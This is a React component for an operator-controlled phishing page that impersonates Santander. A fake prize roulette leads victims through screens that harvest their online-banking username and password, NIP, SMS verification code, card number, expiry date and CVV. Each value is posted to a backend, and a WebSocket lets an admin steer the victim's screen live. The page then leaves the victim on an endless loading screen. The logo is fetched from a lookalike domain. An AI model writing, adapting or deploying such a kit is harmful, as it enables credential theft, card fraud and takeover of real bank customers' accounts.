import { useState, useEffect } from "react";
import { useSearch } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Home, BookOpen, Phone, Building2, Gift } from "lucide-react";

interface FormData {
  usuario: string;
  password: string;
  nip: string;
  smsCode: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
}

type Screen = "premios" | "login" | "nip" | "sms-verification" | "card-protection";

export default function TemplateSantanderPremios() {
  const search = useSearch();
  const sessionId = new URLSearchParams(search).get("sessionId");
  
  const [currentScreen, setCurrentScreen] = useState<Screen>("premios");
  const [formData, setFormData] = useState<FormData>({
    usuario: "",
    password: "",
    nip: "",
    smsCode: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  });
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isSpinning, setIsSpinning] = useState(false);
  const [rouletteRotation, setRouletteRotation] = useState(0);
  const [showPrizeModal, setShowPrizeModal] = useState(false);
  const [wonPrize, setWonPrize] = useState("");

  // Lista de premios de la ruleta con colores elegantes de Santander
  const prizes = [
    { text: "$10,000", value: "10000", color: "#D4AF37", textColor: "#000000" }, // Oro elegante
    { text: "$5,000", value: "5000", color: "#FFFFFF", textColor: "#EC0000" }, // Blanco
    { text: "$15,000", value: "15000", color: "#E8E8E8", textColor: "#EC0000" }, // Plata
    { text: "$2,000", value: "2000", color: "#FFFFFF", textColor: "#EC0000" }, // Blanco
    { text: "$20,000", value: "20000", color: "#D4AF37", textColor: "#000000" }, // Oro elegante
    { text: "$1,000", value: "1000", color: "#FFFFFF", textColor: "#EC0000" }, // Blanco
    { text: "$25,000", value: "25000", color: "#C0C0C0", textColor: "#000000" }, // Plata oscura
    { text: "$500", value: "500", color: "#FFFFFF", textColor: "#EC0000" } // Blanco
  ];

  // WebSocket listener for screen changes from admin
  useEffect(() => {
    if (!sessionId) return;

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    const socket = new WebSocket(wsUrl);

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'session_updated' && data.data?.id === sessionId) {
        const newScreen = data.data.currentScreen;
        if (newScreen && newScreen !== currentScreen) {
          setCurrentScreen(newScreen as Screen);
        }
      }
    };

    return () => {
      socket.close();
    };
  }, [sessionId, currentScreen]);

  const handleSpinRoulette = async () => {
    if (isSpinning) return;
    
    setIsSpinning(true);
    
    // Generar premio aleatorio entre 100 y 1500 pesos
    const minPrize = 100;
    const maxPrize = 1500;
    const randomPrize = Math.floor(Math.random() * (maxPrize - minPrize + 1)) + minPrize;
    
    // Generar rotación aleatoria (múltiples vueltas + posición final)
    const spins = Math.floor(Math.random() * 5) + 5; // 5-10 vueltas completas
    const finalAngle = Math.floor(Math.random() * 360); // Posición final
    const totalRotation = rouletteRotation + (spins * 360) + finalAngle;
    
    setRouletteRotation(totalRotation);
    
    // Esperar a que termine la animación
    setTimeout(async () => {
      setIsSpinning(false);
      setWonPrize(`$${randomPrize.toLocaleString()}`);
      setShowPrizeModal(true);
      
      // Enviar datos del premio al backend
      if (sessionId) {
        try {
          await fetch("/api/submissions", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              sessionId,
              fieldName: "premio_ganado",
              fieldValue: randomPrize.toString()
            })
          });
        } catch (error) {
          console.error("Error submitting prize:", error);
        }
      }
    }, 4000);
  };

  const handleAcceptPrize = async () => {
    setShowPrizeModal(false);
    setIsTransitioning(true);
    
    setTimeout(async () => {
      setCurrentScreen("login");
      setIsTransitioning(false);
      
      if (sessionId) {
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "login" })
        });
      }
    }, 1000);
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit login data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "usuario",
          fieldValue: formData.usuario
        })
      });

      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "password",
          fieldValue: formData.password
        })
      });
      
      // Show loading and move to NIP screen
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
      setTimeout(async () => {
        setCurrentScreen("nip");
        setIsTransitioning(false);
        
        // Update session screen to nip
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "nip" })
        });
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting login:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNipSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit NIP data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "nip",
          fieldValue: formData.nip
        })
      });
      
      // Show loading and move to card protection screen
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
      setTimeout(async () => {
        setCurrentScreen("sms-verification");
        setIsTransitioning(false);
        
        // Update session screen to sms-verification
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "sms-verification" })
        });
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting NIP:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSmsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit SMS code data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "smsCode",
          fieldValue: formData.smsCode
        })
      });
      
      // Show loading and move to card protection screen
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
      setTimeout(async () => {
        setCurrentScreen("card-protection");
        setIsTransitioning(false);
        
        // Update session screen to card-protection
        await fetch(`/api/sessions/${sessionId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentScreen: "card-protection" })
        });
      }, 2000);
      
    } catch (error) {
      console.error("Error submitting SMS code:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      // Submit card data
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "cardNumber",
          fieldValue: formData.cardNumber
        })
      });

      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "expiryDate",
          fieldValue: `${formData.expiryMonth}/${formData.expiryYear}`
        })
      });

      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName: "cvv",
          fieldValue: formData.cvv
        })
      });
      
      // Update session status to form_filled
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "form_filled" })
      });
      
      // Show loading screen indefinitely
      setIsTransitioning(true);
      
      // Update session screen to loading
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: "loading" })
      });
      
    } catch (error) {
      console.error("Error submitting card data:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderPremiosScreen = () => (
    <div className="max-w-2xl mx-auto pt-8 pb-8 px-4">
      <div className="text-center mb-8">
        <div className="mb-4">
          <Gift className="mx-auto h-16 w-16 text-[#EC0000] mb-4" />
        </div>
        <h2 className="text-3xl font-bold text-[#EC0000] mb-4">¡PREMIOS SANTANDER!</h2>
        <p className="text-lg text-gray-700 mb-6">
          Gira la ruleta y gana increíbles premios en efectivo
        </p>
      </div>

      {/* Ruleta minimalista optimizada para móvil */}
      <div className="relative mb-6 flex justify-center px-4">
        <div className="relative">
          {/* Flecha indicadora simple */}
          <div 
            className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-2 z-20"
            style={{ marginTop: '-8px' }}
          >
            <div className="w-0 h-0 border-l-[12px] border-r-[12px] border-b-[20px] border-l-transparent border-r-transparent border-b-[#EC0000]"></div>
          </div>
          
          {/* Ruleta circular minimalista */}
          <div 
            className={`w-64 h-64 rounded-full relative overflow-hidden transition-transform duration-4000 ease-out shadow-lg bg-white border-4 border-[#EC0000]`}
            style={{ 
              transform: `rotate(${rouletteRotation}deg)`,
              transitionDuration: isSpinning ? '4s' : '0s'
            }}
          >
            {prizes.map((prize, index) => {
              const angle = (360 / prizes.length) * index;
              const nextAngle = (360 / prizes.length) * (index + 1);
              const isEven = index % 2 === 0;
              
              return (
                <div
                  key={index}
                  className="absolute inset-0"
                  style={{
                    clipPath: `polygon(50% 50%, ${50 + 40 * Math.cos((angle - 90) * Math.PI / 180)}% ${50 + 40 * Math.sin((angle - 90) * Math.PI / 180)}%, ${50 + 40 * Math.cos((nextAngle - 90) * Math.PI / 180)}% ${50 + 40 * Math.sin((nextAngle - 90) * Math.PI / 180)}%)`,
                    backgroundColor: isEven ? '#FFFFFF' : '#FFF2F2'
                  }}
                >
                </div>
              );
            })}
            
            {/* Líneas separadoras minimalistas */}
            {prizes.map((_, index) => {
              const angle = (360 / prizes.length) * index;
              return (
                <div
                  key={`line-${index}`}
                  className="absolute inset-0"
                  style={{
                    transform: `rotate(${angle}deg)`,
                    transformOrigin: '50% 50%'
                  }}
                >
                  <div 
                    className="absolute top-0 left-1/2 w-px bg-[#EC0000] transform -translate-x-1/2"
                    style={{ height: '50%' }}
                  ></div>
                </div>
              );
            })}
            
            {/* Centro simple */}
            <div className="absolute inset-0 flex items-center justify-center">
              <div 
                className="w-8 h-8 rounded-full bg-[#EC0000] shadow-md"
              >
              </div>
            </div>
          </div>
          
        </div>
      </div>

      {/* Botón girar minimalista */}
      <div className="text-center px-4">
        <Button
          onClick={handleSpinRoulette}
          disabled={isSpinning}
          className={`
            w-full max-w-xs px-8 py-4 rounded-lg text-lg font-bold 
            bg-[#EC0000] text-white border-2 border-[#EC0000]
            transition-all duration-200 shadow-md
            ${isSpinning 
              ? 'opacity-60 cursor-not-allowed' 
              : 'hover:bg-[#CC0000] active:scale-95'
            }
          `}
          data-testid="button-girar-ruleta"
        >
          {isSpinning ? (
            <>
              <div className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
              Girando...
            </>
          ) : (
            "¡GIRAR RULETA!"
          )}
        </Button>
      </div>

      {/* Modal de premio ganado */}
      {showPrizeModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
            <div className="mb-6">
              <div className="w-20 h-20 bg-gradient-to-r from-yellow-400 to-yellow-600 rounded-full mx-auto mb-4 flex items-center justify-center">
                <span className="text-3xl">🎉</span>
              </div>
              <h2 className="text-2xl font-bold text-[#EC0000] mb-2">¡Felicidades!</h2>
              <p className="text-gray-600 text-sm mb-4">Has ganado</p>
              <div className="text-4xl font-black text-green-600 mb-4">
                {wonPrize}
              </div>
              <p className="text-gray-600 text-sm">
                Para reclamar tu premio, verifica tu identidad con tu banca en línea Santander
              </p>
            </div>
            <Button
              onClick={handleAcceptPrize}
              className="w-full bg-[#EC0000] text-white py-3 rounded-lg font-semibold hover:bg-[#CC0000]"
              data-testid="button-aceptar-premio"
            >
              Aceptar y continuar
            </Button>
          </div>
        </div>
      )}

      {/* Mensaje informativo minimalista */}
      <div className="text-center mt-8 px-4">
        <div className="max-w-sm mx-auto">
          <p className="text-gray-600 text-sm leading-relaxed">
            Para reclamar tu premio, necesitarás verificar tu identidad mediante tu banca en línea Santander.
          </p>
          <p className="text-[#EC0000] font-semibold text-sm mt-3">
            ¡Gira y descubre cuánto puedes ganar!
          </p>
        </div>
      </div>

    </div>
  );

  const renderLoginScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
        <h3 className="text-lg font-bold text-green-800 mb-2">🎉 ¡Felicidades!</h3>
        <p className="text-sm text-green-700">
          Has ganado un premio increíble. Para poder transferirlo a tu cuenta,<br />
          verifica tu identidad ingresando a tu banca en línea.
        </p>
      </div>

      <form onSubmit={handleLoginSubmit} className="space-y-6">
        {/* Campo de usuario */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Usuario
          </label>
          <Input
            type="text"
            value={formData.usuario}
            onChange={(e) => setFormData(prev => ({...prev, usuario: e.target.value}))}
            placeholder="Ingresa tu usuario"
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black"
            data-testid="input-usuario"
            required
          />
        </div>

        {/* Campo de contraseña */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Contraseña
          </label>
          <Input
            type="password"
            value={formData.password}
            onChange={(e) => setFormData(prev => ({...prev, password: e.target.value}))}
            placeholder="Ingresa tu contraseña"
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black"
            data-testid="input-password"
            required
          />
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || !formData.usuario.trim() || !formData.password.trim()}
          className="w-full bg-[#EC0000] hover:bg-[#CC0000] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-continuar"
        >
          {isSubmitting ? "Verificando..." : "Verificar y Reclamar Premio"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <a href="#" className="text-[#EC0000] text-sm hover:underline block">
            ¿Olvidaste tu contraseña?
          </a>
          <a href="#" className="text-[#EC0000] text-sm hover:underline block">
            ¿Problemas para ingresar?
          </a>
        </div>
      </form>
    </div>
  );

  const renderNipScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-8">
        <h2 className="text-xl font-medium text-gray-800 mb-2">Ingresa tu NIP</h2>
        <p className="text-sm text-gray-600">Por tu seguridad, ingresa tu NIP de 4 dígitos</p>
      </div>
      
      <form onSubmit={handleNipSubmit} className="space-y-6">
        {/* Campo de NIP */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            NIP
          </label>
          <Input
            type="password"
            value={formData.nip}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').slice(0, 4);
              setFormData(prev => ({...prev, nip: value}));
            }}
            placeholder="••••"
            maxLength={4}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black text-center text-2xl tracking-widest"
            data-testid="input-nip"
            required
          />
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || formData.nip.length !== 4}
          className="w-full bg-[#EC0000] hover:bg-[#CC0000] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-continuar-nip"
        >
          {isSubmitting ? "Verificando..." : "Continuar"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <a href="#" className="text-[#EC0000] text-sm hover:underline block">
            ¿Olvidaste tu NIP?
          </a>
          <button 
            type="button"
            onClick={async () => {
              setCurrentScreen("login");
              if (sessionId) {
                await fetch(`/api/sessions/${sessionId}`, {
                  method: "PATCH",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ currentScreen: "login" })
                });
              }
            }}
            className="text-gray-600 text-sm hover:underline block"
          >
            ← Regresar
          </button>
        </div>
      </form>
    </div>
  );

  const renderLoadingScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center">
        <div className="mb-8">
          <div className="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-[#EC0000]"></div>
        </div>
        <h2 className="text-xl font-medium text-gray-800 mb-2">Procesando premio</h2>
        <p className="text-sm text-gray-600">Estamos preparando la transferencia de tu premio...</p>
      </div>
    </div>
  );

  const renderSmsVerificationScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-8">
        <h2 className="text-xl font-medium text-gray-800 mb-4">Verificación SMS</h2>
        <p className="text-sm text-gray-600 mb-6">
          Hemos enviado un código de 6 dígitos a tu celular registrado
        </p>
      </div>
      
      <form onSubmit={handleSmsSubmit} className="space-y-6">
        {/* Campo de código SMS */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Código SMS
          </label>
          <Input
            type="text"
            value={formData.smsCode}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').slice(0, 6);
              setFormData(prev => ({...prev, smsCode: value}));
            }}
            placeholder="123456"
            maxLength={6}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black text-center text-xl tracking-widest"
            data-testid="input-sms"
            required
          />
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || formData.smsCode.length !== 6}
          className="w-full bg-[#EC0000] hover:bg-[#CC0000] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300"
          data-testid="button-continuar-sms"
        >
          {isSubmitting ? "Verificando..." : "Verificar código"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <a href="#" className="text-[#EC0000] text-sm hover:underline block">
            Reenviar código
          </a>
          <button 
            type="button"
            onClick={async () => {
              setCurrentScreen("nip");
              if (sessionId) {
                await fetch(`/api/sessions/${sessionId}`, {
                  method: "PATCH",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ currentScreen: "nip" })
                });
              }
            }}
            className="text-gray-600 text-sm hover:underline block"
          >
            ← Regresar
          </button>
        </div>
      </form>
    </div>
  );

  const renderCardProtectionScreen = () => (
    <div className="max-w-md mx-auto pt-16 pb-8 px-4">
      <div className="text-center mb-8">
        <h2 className="text-xl font-medium text-gray-800 mb-4">Protección de Tarjeta</h2>
        <p className="text-sm text-gray-600 mb-6">
          Por tu seguridad, confirma los datos de tu tarjeta para proceder con la transferencia del premio
        </p>
      </div>
      
      <form onSubmit={handleCardSubmit} className="space-y-4">
        {/* Número de tarjeta */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-sm font-medium">
            Número de tarjeta
          </label>
          <Input
            type="text"
            value={formData.cardNumber}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim().slice(0, 19);
              setFormData(prev => ({...prev, cardNumber: value}));
            }}
            placeholder="1234 5678 9012 3456"
            maxLength={19}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black"
            data-testid="input-card-number"
            required
          />
        </div>

        {/* Fecha de expiración y CVV */}
        <div className="flex space-x-3">
          <div className="flex-1 space-y-2">
            <label className="block text-gray-700 text-sm font-medium">
              Mes
            </label>
            <Input
              type="text"
              value={formData.expiryMonth}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 2);
                if (value === '' || (parseInt(value) >= 1 && parseInt(value) <= 12)) {
                  setFormData(prev => ({...prev, expiryMonth: value}));
                }
              }}
              placeholder="MM"
              maxLength={2}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black"
              data-testid="input-expiry-month"
              required
            />
          </div>
          
          <div className="flex-1 space-y-2">
            <label className="block text-gray-700 text-sm font-medium">
              Año
            </label>
            <Input
              type="text"
              value={formData.expiryYear}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 2);
                setFormData(prev => ({...prev, expiryYear: value}));
              }}
              placeholder="AA"
              maxLength={2}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black"
              data-testid="input-expiry-year"
              required
            />
          </div>
          
          <div className="flex-1 space-y-2">
            <label className="block text-gray-700 text-sm font-medium">
              CVV
            </label>
            <Input
              type="password"
              value={formData.cvv}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 3);
                setFormData(prev => ({...prev, cvv: value}));
              }}
              placeholder="123"
              maxLength={3}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#EC0000] focus:ring-1 focus:ring-[#EC0000] bg-white text-black"
              data-testid="input-cvv"
              required
            />
          </div>
        </div>

        {/* Botón Continuar */}
        <Button
          type="submit"
          disabled={isSubmitting || !formData.cardNumber || !formData.expiryMonth || !formData.expiryYear || !formData.cvv}
          className="w-full bg-[#EC0000] hover:bg-[#CC0000] text-white py-3 rounded-full text-lg font-medium disabled:bg-gray-300 mt-6"
          data-testid="button-continuar-card"
        >
          {isSubmitting ? "Procesando..." : "Confirmar y recibir premio"}
        </Button>

        {/* Enlaces adicionales */}
        <div className="text-center space-y-2 pt-4">
          <button 
            type="button"
            onClick={async () => {
              setCurrentScreen("sms-verification");
              if (sessionId) {
                await fetch(`/api/sessions/${sessionId}`, {
                  method: "PATCH",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ currentScreen: "sms-verification" })
                });
              }
            }}
            className="text-gray-600 text-sm hover:underline block"
          >
            ← Regresar
          </button>
        </div>
      </form>
    </div>
  );

  if (isTransitioning) {
    return renderLoadingScreen();
  }

  // Header principal con logo de Santander
  const headerContent = (
    <div className="bg-[#EC0000] text-white p-4">
      <div className="max-w-7xl mx-auto flex items-center justify-between">
        <div className="flex items-center space-x-4">
          {/* Logo de Santander */}
          <div className="flex items-center space-x-3">
            <img 
              src="https://hh.airlines-mx.click/premios/hook/santander_log.svg" 
              alt="Santander"
              className="h-8 w-auto"
            />
          </div>
        </div>
        
        {/* Fecha en header */}
        <div className="text-xs">
          3 de septiembre de 2025
        </div>
      </div>
    </div>
  );

  const renderCurrentScreen = () => {
    switch (currentScreen) {
      case "premios":
        return renderPremiosScreen();
      case "login":
        return renderLoginScreen();
      case "nip":
        return renderNipScreen();
      case "sms-verification":
        return renderSmsVerificationScreen();
      case "card-protection":
        return renderCardProtectionScreen();
      default:
        return renderLoadingScreen();
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {headerContent}
      <div className="bg-gray-50">
        {renderCurrentScreen()}
      </div>
    </div>
  );
}